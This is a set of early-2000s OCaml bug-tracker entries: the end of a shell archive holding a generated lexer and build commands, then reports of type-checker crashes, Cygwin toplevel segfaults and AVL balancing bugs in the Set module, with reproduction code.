\\023\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\255\\255\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \";\n-  Lexing.lex_check = \n-   \"\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\012\\000\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\000\\000\\255\\255\\000\\000\\000\\000\\001\\000\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\000\\000\\255\\255\\255\\255\\255\\255\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\255\\255\\255\\255\\255\\255\\000\\000\\255\\255\\255\\255\\\n-    \\255\\255\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\255\\255\\255\\255\\255\\255\\001\\000\\000\\000\\\n-    \\255\\255\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\014\\000\\024\\000\\014\\000\\014\\000\\014\\000\\\n-    \\014\\000\\014\\000\\014\\000\\014\\000\\014\\000\\014\\000\\014\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\255\\255\\255\\255\\255\\255\\255\\255\\016\\000\\255\\255\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\255\\255\\255\\255\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\255\\255\\\n-    \\000\\000\\004\\000\\001\\000\\017\\000\\012\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\018\\000\\\n-    \\018\\000\\018\\000\\018\\000\\018\\000\\018\\000\\018\\000\\018\\000\\018\\000\\\n-    \\018\\000\\019\\000\\255\\255\\019\\000\\019\\000\\019\\000\\019\\000\\019\\000\\\n-    \\019\\000\\019\\000\\019\\000\\019\\000\\019\\000\\020\\000\\020\\000\\020\\000\\\n-    \\020\\000\\020\\000\\020\\000\\020\\000\\020\\000\\020\\000\\020\\000\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\021\\000\\255\\255\\\n-    \\021\\000\\255\\255\\020\\000\\021\\000\\021\\000\\021\\000\\021\\000\\021\\000\\\n-    \\021\\000\\021\\000\\021\\000\\021\\000\\021\\000\\022\\000\\022\\000\\022\\000\\\n-    \\022\\000\\022\\000\\022\\000\\022\\000\\022\\000\\022\\000\\022\\000\\023\\000\\\n-    \\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\\n-    \\023\\000\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\024\\000\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \"\n-}\n-\n-let rec scan lexbuf = __ocaml_lex_scan_rec lexbuf 0\n-and __ocaml_lex_scan_rec lexbuf state =\n-  match Lexing.engine lex_tables state lexbuf with\n-    0 -> (\n-# 39 \"rc_scan.mll\"\n-                          EOF )\n-  | 1 -> (\n-# 40 \"rc_scan.mll\"\n-                          scan lexbuf )\n-  | 2 -> (\n-# 41 \"rc_scan.mll\"\n-                          scan lexbuf )\n-  | 3 -> (\n-# 42 \"rc_scan.mll\"\n-                          scan lexbuf )\n-  | 4 -> (\n-# 43 \"rc_scan.mll\"\n-                          scan lexbuf )\n-  | 5 -> (\n-# 45 \"rc_scan.mll\"\n-                          let s = get lexbuf in\n-                          try  keyword s \n-                          with Not_found -> debug \"id\"; ID(s) \n-                        )\n-  | 6 -> (\n-# 49 \"rc_scan.mll\"\n-                          try \n-                            INT   (int_of_string (get lexbuf)) \n-                          with Failure _ -> \n-                            let msg = \"illegal integer `\" ^ (get lexbuf) ^ \"'\"\n-                            in  error msg \n-                        )\n-  | 7 -> (\n-# 55 \"rc_scan.mll\"\n-                          try\n-                            FLOAT (float_of_string (get lexbuf)) \n-                          with Failure _ -> \n-                            let msg = \"illegal float `\" ^ (get lexbuf) ^ \"'\"\n-                            in  error msg \n-                        )\n-  | 8 -> (\n-# 61 \"rc_scan.mll\"\n-                          Buffer.clear strBuffer\n-                        ; string lexbuf \n-                        ; STR(Buffer.contents strBuffer)\n-                        )\n-  | 9 -> (\n-# 66 \"rc_scan.mll\"\n-                          EQUAL )\n-  | 10 -> (\n-# 67 \"rc_scan.mll\"\n-                          COMMA )\n-  | 11 -> (\n-# 69 \"rc_scan.mll\"\n-                          let c = get lexbuf in\n-                            error (\"illegal character `\" ^ c ^ \"'\")\n-                        )\n-  | n -> lexbuf.Lexing.refill_buff lexbuf; __ocaml_lex_scan_rec lexbuf n\n-\n-and string lexbuf = __ocaml_lex_string_rec lexbuf 1\n-and __ocaml_lex_string_rec lexbuf state =\n-  match Lexing.engine lex_tables state lexbuf with\n-    0 -> (\n-# 73 \"rc_scan.mll\"\n-                          error \"unterminated string\" )\n-  | 1 -> (\n-# 74 \"rc_scan.mll\"\n-                          (* return *) )\n-  | 2 -> (\n-# 76 \"rc_scan.mll\"\n-                          let c = String.get (get lexbuf) 1 in\n-                            Buffer.add_char strBuffer c;\n-                            string lexbuf\n-                        )\n-  | 3 -> (\n-# 80 \"rc_scan.mll\"\n-                          Buffer.add_string strBuffer (get lexbuf)\n-                        ; string lexbuf\n-                        )\n-  | n -> lexbuf.Lexing.refill_buff lexbuf; __ocaml_lex_string_rec lexbuf n\n-\n-;;\n-\nEnd of rc_scan.ml\necho rc.ml 1>&2\nsed 's/^-//' >'rc.ml' <<'End of rc.ml'\n-# 82 \"rc.nw\"\n-type id         = Rc_ast.id\n-type rc         = Rc_ast.rc\n-type rcdict     = Rc_ast.rcdict\n-\n-exception Error of string\n-let error msg   = raise (Error msg)\n-# 94 \"rc.nw\"\n-let find   = Rc_ast.find\n-let asList = Rc_ast.asList\n-# 102 \"rc.nw\"\n-let read file = \n-    let file_ic         = try open_in file with \n-                          Sys_error msg -> error msg            in\n-    let lexbuf          = Lexing.from_channel file_ic           in\n-    let finally ()      = close_in file_ic                      in\n-    let rc              = try \n-                                Rc_parse.rcfile Rc_scan.scan lexbuf\n-                          with\n-                          | Parsing.Parse_error ->\n-                                finally ();\n-                                error (\"parse error in `\" ^ file ^ \"'\")\n-                          | Rc_scan.ScanError msg -> error msg\n-                          | e                   ->\n-                                finally ();\n-                                raise e                         in\n-        finally ();\n-        rc\nEnd of rc.ml\necho buildme 1>&2\nsed 's/^-//' >'buildme' <<'End of buildme'\n-ocamlc  -c lc.mli\n-ocamlc  -c rc_ast.mli\n-ocamlc  -c rc_parse.mli\n-ocamlc  -c pc.mli\n-ocamlc  -c pp.mli\n-ocamlc  -c rx.mli\n-ocamlc  -c srcmap.mli\n-ocamlc  -c verbose.mli\n-ocamlopt  -c lc.ml\n-ocamlopt  -c rc_ast.ml\n-ocamlc  -c rc.mli\n-ocamlopt  -c pc.ml\n-ocamlopt  -c pp.ml\n-ocamlopt  -c rx.ml\n-ocamlopt  -c srcmap.ml\n-ocamlopt  -c verbose.ml\n-ocamlopt  -c rc_parse.ml\n-ocamlopt  -c rc_scan.ml\n-ocamlopt  -c rc.ml\n-ocamlopt  -a -o cllib.cmxa lc.cmx rc.cmx rc_parse.cmx rc_scan.cmx pc.cmx pp.cmx rc_ast.cmx rx.cmx srcmap.cmx verbose.cmx\nEnd of buildme\nexit 0\n"},{"labels":["bug"],"text":"**Original bug ID:** 1731\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Bow-Yaw Wang\nVersion: 3.06+36 (2003-06-19)\nOS: Mac OS X\nSubmission from: 140.109.21.73 (140.109.21.73)\n\n\n\nAdding polymorphic variants constraints in classes may\ncause stack overflow. Here is the source:\n\nb.ml:\nclass ['t] a =\nobject\n  constraint 't = [> `A of 't a]\nend\n\ntype t = [ `A of t a ]\n\ndhcp066:~$ocamlc -c b.ml\nFatal error: exception Stack_overflow\n\nIf the constraint is removed, the compiler works fine.\n\nPlease take a look, thanks.\n\nBow-Yaw\n"},{"labels":["bug"],"text":"**Original bug ID:** 1730\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\naprÃ¨s avoir testÃ© les modules rÃ©cursifs, je suis tombÃ©s sur un bug et \nquelques limitations :\n\n- type checker crash :\n\n  cafe[15:21]%cat tmp.mli \n  module rec M1 : sig\n    class o : object end\n  end\n  and M2 : sig\n    val f : #M1.o -> bool\n  end\n  cafe[15:21]%ocamlc tmp.mli\n  Fatal error: exception Assert_failure(\"typing/typetexp.ml\", 275, 10)\n\n\n- les modules rÃ©cursifs ne se marient pas bien avec les variantes \npolymorphes :\n\n    module rec M1 : sig\n      type t = [ `A | `B ]\n    end\n    and M2 : sig\n      val f : [> M1.t ] -> bool\n      type t = [ M1.t | `C ] \n    end\n\n- une autre limitation est l'impossibilitÃ© de dÃ©finir des signatures \nrÃ©cursives. Est-ce une limitation technique, ou un oubli ?\n\nEnfin un voeux pour l'avenir : les modules rÃ©cursifs appliquÃ©s Ã  un seul \nmodule permettent de contourner des limitations du systÃ¨me de type \nactuel :\n- classe et type mutuellements rÃ©cursifs (mais on ne peut pas dÃ©finir la \nsignature correspondante !),\n- rÃ©cursion polymorphe,\n- coercion de self dans une classe en cours de dÃ©finition,\n- d'autres ?\nJe me demandait donc si en cas de prÃ©sence d'un fichier .mli, le \ncompilateur pourrait comprendre le module courant comme rÃ©cursif pour \nÃ©viter une encapsulation supplÃ©mentaire, en rÃ©servant alors un mot clÃ©\n(Rec ?  Self ?) pour dÃ©signer le module.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1728\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Bow-Yaw Wang\nVersion: 3.06+36 (2003-06-19)\nOS: Mac OS X\nSubmission from: 140.109.21.73 (140.109.21.73)\n\n\n\nI'm trying to implement visitor pattern with polymorphic\nvariants (Jacques, thanks :)). Here are the files and transcript:\n\na.mli:\nclass a :\n  object ('o)\n    method invite : 'c 'v . (([>`A of 'o] as 'c) -> 'v) -> 'v\n  end\n\na.ml:\nclass a =\n  object (self : 'o)\n    method invite : 'c 'v . (([>`A of 'o] as 'c) -> 'v) -> 'v =\n      fun f -> f (`A self)\n  end\n\ndhcp066:~$ocamlc -c a.mli\ndhcp066:~$ocamlc -c a.ml\nFatal error: exception Assert_failure(\"typing/btype.ml\", 202, 26)\n\nIf I type the definition of class a interactively, it compiles without\nany problem.\n\nSorry for not using the stable version. I hope the latest cvs\nversion can do.\n\nThanks,\n\nBow-Yaw\n"},{"labels":["bug"],"text":"**Original bug ID:** 1727\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Bow-Yaw Wang\nVersion: 3.06+36 (2003-06-19)\nOS: Mac OS X\nSubmission from: 140.109.21.73 (140.109.21.73)\n\n\n\nI'm trying to implement visitor pattern with polymorphic\nvariants (Jacques, thanks :)). Here are the files and transcript:\n\na.mli:\nclass a :\n  object ('o)\n    method invite : 'c 'v . (([>`A of 'o] as 'c) -> 'v) -> 'v\n  end\n\na.ml:\nclass a =\n  object (self : 'o)\n    method invite : 'c 'v . (([>`A of 'o] as 'c) -> 'v) -> 'v =\n      fun f -> f (`A self)\n  end\n\ndhcp066:~$ocamlc -c a.mli\ndhcp066:~$ocamlc -c a.ml\nFatal error: exception Assert_failure(\"typing/btype.ml\", 202, 26)\n\nIf I type the definition of class a interactively, it compiles without\nany problem.\n\nSorry for not using the stable version. I hope the latest cvs\nversion can do.\n\nThanks,\n\nBow-Yaw\n"},{"labels":["bug"],"text":"**Original bug ID:** 1725\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Virgile Prevosto\nVersion: 3.06\nOS: Linux (RedHat 7.2)\nSubmission from: 132.227.83.215 (132.227.83.215)\n\n\nEntering the following code at toplevel results in a Stack Overflow, and exits\nthe toplevel:\n--------------------------\nclass mother  = object\nend;;\n\nclass daughter = \nobject\ninherit mother\nmethod get_x = 0\nend;;\n\nlet f (l : #mother list ) = List.tl l;;\n\nlet m1 = new mother ;;\n\nlet m2 = new daughter;;\n\nf [m1];;\n\nf [m2];;\n\n[m1; m2];; (* not well-typed. *)\n[m1;(m2 :>mother)];;\n---------------------------\nStranger than that, if you omit the calls to f or the erroneous definition [m1;\nm2], everything works well...\n"},{"labels":["bug"],"text":"**Original bug ID:** 1724\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Michael Matusiak\nVersion: 3.06\nOS: linux, kernel 2.4.20\nSubmission from: pb160.tarnobrzeg.cvx.ppp.tpnet.pl (213.77.197.160)\n\n\nI found out the following problem when I was configuring ocaml:\nif you have ndbm included in gdbm (as compatibility feature) configure doesn't\nfind this out because to turn on compatibility with ndbm you have to specify\nadditional library: gdbm_compat (with -lgdbm_compat)\nthere is very small change in configure code to fix this, it's something like\nthat:\n... hasgot -lgdbm -lgdbm_compat dbm_open ...\nThanks\n"},{"labels":["bug"],"text":"**Original bug ID:** 1723\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Steve Salkin\nVersion: OCaml 3.06\nOS: cygwin on xp\nSubmission from: c-24-99-91-117.atl.client2.attbi.com (24.99.91.117)\n\n\nJust built the interpreter using make world; make bootstrap; make opt\nMost everything seems to work fine, I define and run factorial etc.\nHere's the problem I see with floating point numbers:\n\n# 3 + 2 ;;\n- : int = 5\n# 3.0 + 2.0 \nSegmentation fault (core dumped)\n\n# 3.0 + 2\nSegmentation fault (core dumped)\n\n# 3.0 +. 2.0\nthis one just sits forever (apparently; halting problem and all)\n\nI don't see any errors in the compile log, which I am happy to provide.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1722\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi,\n\nI have found a crash in the ocaml-3.06 toplevel under cygwin.\n\nUnder cygwin, I get:\n\n        Objective Caml version 3.06\n\n# let vol ~w ~h ~d = w * h * d;;\nval vol : w:int -> h:int -> d:int -> int = <fun>\n# vol 42;;\nSegmentation fault (core dumped)\n\n\nWhereas under linux, it works correctly:\n\n        Objective Caml version 3.06\n\n# let vol ~w ~h ~d = w * h * d;;\nval vol : w:int -> h:int -> d:int -> int = <fun>\n# vol 42;;\nCharacters 4-6:\n  vol 42;;\n      ^^\nExpecting function has type w:int -> h:int -> d:int -> int\nThis argument cannot be applied without label\n\nI hope this bug report is useful.  I like ocaml a lot.  I managed to crash\nemacs too a few days ago too.  My world is falling to bits! :-)\n\nAndrew\n\n--\n- http://www.nobugs.org -\n"},{"labels":["bug"],"text":"**Original bug ID:** 1721\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nToutes mes excuses : mon bug  report #1720 est parti avant que j'ai pu\nfinir de le taper. Je  termine donc mes explications concernant le bug\nde la fonction Set.remove.\n\nLa fonction en cause est ici la fonction merge :\n\n======================================================================\n   (* Merge two trees l and r into one.\n       All elements of l must precede the elements of r.\n       Assumes | height l - height r | <= 2. *)\n\n    let rec merge t1 t2 = match (t1, t2) with\n      | (Empty, t) | (t, Empty) -> t\n      | (Node(l1, v1, r1, h1), Node(l2, v2, r2, h2)) ->\n          bal l1 v1 (bal (merge r1 l2) v2 r2)\n ======================================================================\n\nComme le  dit le  commentaire elle suppose  une diffÃ©rence  de hauteur\nd'au  plus 2  entre t1  et t2  mais clairement  dans  l'appel rÃ©cursif\n(merge r1  l2) ce n'est pas  toujours le cas (par  exemple si h(l1)=2,\nh(l2)=4, h(r1)=0 et h(r2)=2).\n\nDeux solutions possibles (au moins) :\n\n- utiliser \"join\"  (quand il sera corrigÃ©  :-) au lieu de  \"bal\" et ne\n  plus faire d'hypothÃ¨ses sur les hauteurs de t1 et t2\n\n- Ã©crire merge Ã  l'aide de  deux fonctions remove_min et remove_max de\n  la faÃ§on suivante :\n\n  ======================================================================\n    let rec remove_min = function\n      | Empty -> assert false\n      | Node (Empty, x, r, _) -> x, r\n      | Node (l, x, r, _) -> let m,l' = remove_min l in m, bal l' x r\n\n    let rec remove_max = function\n      | Empty -> assert false\n      | Node (l, x, Empty, _) -> x, l\n      | Node (l, x, r, _) -> let m,r' = remove_max r in m, bal l x r'\n\n    let merge2 t1 t2 = match t1, t2 with\n      | Empty, t | t, Empty -> t\n      | (Node (_, _, _, h1) as t1), (Node (_, _, _, h2) as t2) ->\n\t  if h1 >= h2 then\n\t    let m,t'1 = remove_max t1 in bal t'1 m t2\n\t  else \n\t    let m,t'2 = remove_min t2 in bal t1 m t'2\n  ======================================================================\n\n  Notez que l'on se rapproche lÃ  de la maniÃ¨re traditionnelle d'Ã©crire\n  remove.\n\nCordialement,\n-- \nJean-Christophe\n"},{"labels":["bug"],"text":"**Original bug ID:** 1720\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jean-Christophe FilliÃ¢tre\nVersion: 3.06\nOS: Linux (Debian Woody)\nSubmission from: pc8-123.lri.fr (129.175.8.123)\n\n\nBonjour,\n\nCe message fait suite au PR #1717.\n\nJ'ai poursuivi mes investigations dans le module Set. En cherchant Ã  certifier\nla fonction remove, j'y ai trouvÃ© Ã©galement un problÃ¨me d'Ã©quilibrage    \n\nlet remove_c x s = \n      let s' = remove x s in \n      (try check s' with Assert_failure _ -> raise (Found_1 (x, s)));\n      s'\n\n    let _ = \n      while true do \n\tignore (remove_c (Random.int 10) (build 0 10 10))\n      done\n"},{"labels":["bug"],"text":"**Original bug ID:** 1717\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jean-Christophe Filliatre\nVersion: 3.06\nOS: Linux (Debian Woody)\nSubmission from: pc8-123.lri.fr (129.175.8.123)\n\n\nBonjour,\n\nEn cherchant Ã  certifier le module Set d'ocaml en Coq, j'ai trouvÃ© un bug : les\nAVL construits ne respectent pas (toujours) l'invariant sur les hauteurs.\n\nJe joints ci-dessous un code qui illustre le problÃ¨me : c'est une copie du code\nde\nSet sur le type int (seulement empty, add, union) Ã  laquelle j'ajoute une\nfonction\ncheck vÃ©rifiant l'invariant. Je fais alors l'union d'ensembles construits\nalÃ©atoirement jusqu'Ã  trouver une mise en dÃ©faut de l'invariant (c'est trÃ¨s\nrapide;\nfaire \"ocaml bug.ml\" pour obtenir un Assert_failure).\n\nExplication : Le problÃ¨me vient de la fonction \"join l x r\", qui peut constuire\nun\nAVL mal formÃ©. En effet, si \"l\" est trÃ¨s haut, avec deux sous-arbres de mÃªme\nhauteur,\nt que \"r\" est trÃ¨s petit, alors \"bal l x r\" va construire un arbre \"Node (l',\nx', r', _)\" qui vÃ©rifie bien l'invariant |height l' - height r'| <= 2, et donc\njoin s'arrÃªte tout de suite, mais \"r'\" sera mal formÃ© parce que composÃ© d'un\nsous-arbre gauche trÃ¨s grand (l'ancien sous-arbre droit de \"l\") et d'un\nsous-arbre droit trÃ¨s petit, \"r\".\n\nOn illustre donc le problÃ¨me en faisant l'union d'un gros ensemble et d'un petit\nensemble : avec un peu de (mal)chance les appels rÃ©cursifs \"union l1 l2\" et\n\"union r1 r2\" vont donner un gros ensemble et un petit, et \"join\" va alors\nfabriquer un AVL mal formÃ©.\n\nJe ne vois pas de solution simple : il ne semble pas facile d'Ã©crire \"join\" en\nutilisant \"bal\" sans indication du rÃ©Ã©quilibrage effectuÃ©. Il faudrait sans\ndoute inliner le code \"bal\" dans \"join\" pour pouvoir faire des appels rÃ©cursifs\nÃ  \"join\" sur les arbres construits par le rÃ©Ã©quilibrage. Ou trouver une autre\nmaniÃ¨re de faire l'union :-)\n\nPour l'instant je vais me concenter de la certification des fonctions\nn'utilisant pas join...\n\nAmicalement,\n--\nJean-Christophe\n\n===================================================================================\nmodule Ord = struct\n  type t = int \n  let compare = compare\nend\n\n    type elt = Ord.t\n    type t = Empty | Node of t * elt * t * int\n\n    (* Sets are represented by balanced binary trees (the heights of the\n       children differ by at most 2 *)\n\n    let height = function\n        Empty -> 0\n      | Node(_, _, _, h) -> h\n\n    (* Creates a new node with left son l, value x and right son r.\n       l and r must be balanced and | height l - height r | <= 2.\n       Inline expansion of height for better speed. *)\n\n    let create l x r =\n      let hl = match l with Empty -> 0 | Node(_,_,_,h) -> h in\n      let hr = match r with Empty -> 0 | Node(_,_,_,h) -> h in\n      Node(l, x, r, (if hl >= hr then hl + 1 else hr + 1))\n\n    (* Same as create, but performs one step of rebalancing if necessary.\n       Assumes l and r balanced.\n       Inline expansion of create for better speed in the most frequent case\n       where no rebalancing is required. *)\n\n    let bal l x r =\n      let hl = match l with Empty -> 0 | Node(_,_,_,h) -> h in\n      let hr = match r with Empty -> 0 | Node(_,_,_,h) -> h in\n      if hl > hr + 2 then begin\n        match l with\n          Empty -> invalid_arg \"Set.bal\"\n        | Node(ll, lv, lr, _) ->\n            if height ll >= height lr then\n              create ll lv (create lr x r)\n            else begin\n              match lr with\n                Empty -> invalid_arg \"Set.bal\"\n              | Node(lrl, lrv, lrr, _)->\n                  create (create ll lv lrl) lrv (create lrr x r)\n            end\n      end else if hr > hl + 2 then begin\n        match r with\n          Empty -> invalid_arg \"Set.bal\"\n        | 